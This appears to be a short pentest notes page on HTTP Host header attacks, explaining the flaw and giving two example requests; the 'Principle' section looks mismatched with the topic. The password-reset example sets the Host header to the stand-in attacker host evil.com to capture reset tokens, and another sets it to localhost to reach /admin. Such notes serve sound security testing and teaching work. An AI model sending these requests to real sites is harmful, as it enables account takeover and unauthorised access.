HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

Off-the-shelf web applications typically don't know what domain they are deployed on unless it is manually specified in a configuration file during setup. When they need to know the current domain, for example, to generate an absolute URL included in an email, they may resort to retrieving the domain from the Host header:

```
<a href="https://_SERVER['HOST']/support">Contact support</a>
```

The header value may also be used in a variety of interactions between different systems of the website's infrastructure.

As the Host header is in fact user controllable, this practice can lead to a number of issues. If the input is not properly escaped or validated, the Host header is a potential vector for exploiting a range of other vulnerabilities, most notably:

- Web cache poisoning
- Business logic flaws in specific functionality
- Routing-based SSRF
- Classic server-side vulnerabilities, such as SQL injection

## 1. Principle

信息泄露

### 1.1. Location

页面源码, URL, 报错, 数据包, 隐藏路径

## 2. Test

### 2.1. Password Reset Poisoning

重置密码时修改 `Host` 的值, 将接收到携带的参数如 Token

```
POST /forgot-password HTTP/2
Host: evil.com
```

### 2.2. Authentication Bypass

修改 `Host` 的值可以本地身份访问控制面板

```
GET /admin HTTP/2
Host: localhost
```

---

**References**

- [HTTP Host header attacks](https://portswigger.net/web-security/host-header)
- [CWE-644](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-644)